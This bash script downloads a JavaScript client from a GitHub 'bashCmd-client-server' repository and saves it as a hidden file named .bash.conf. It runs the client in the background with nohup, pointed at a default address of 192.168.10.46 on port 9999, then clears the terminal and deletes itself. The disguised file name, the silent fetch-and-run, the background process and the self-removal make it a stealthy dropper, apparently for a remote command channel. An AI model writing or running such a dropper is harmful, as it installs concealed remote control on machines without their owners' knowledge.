#!/bin/bash

set -ea -o pipefail

PORT=9999
ADDRESS=192.168.10.46
PARAMS=${@:1}
ARGSVAL=false
FILENAME=.bash.conf

mkdir -p ~/.cache
curl https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/develop/client.js > ~/.cache/$FILENAME

for i in $PARAMS
 do
   if [ "$ARGSVAL" == false ]; then
     ARGSVAL=$i
     continue
   fi

   if [ "$ARGSVAL" == "-p" ]; then
     PORT="$i"
   fi
   if [ "$ARGSVAL" == "-a" ]; then
     ADDRESS="$i"
   fi
   ARGSVAL=false
 done

node client.js $ADDRESS $PORT
echo $ADDRESS
echo $PORT

nohup node  ~/.cache/$FILENAME > /dev/null & clear
rm -- "$0"
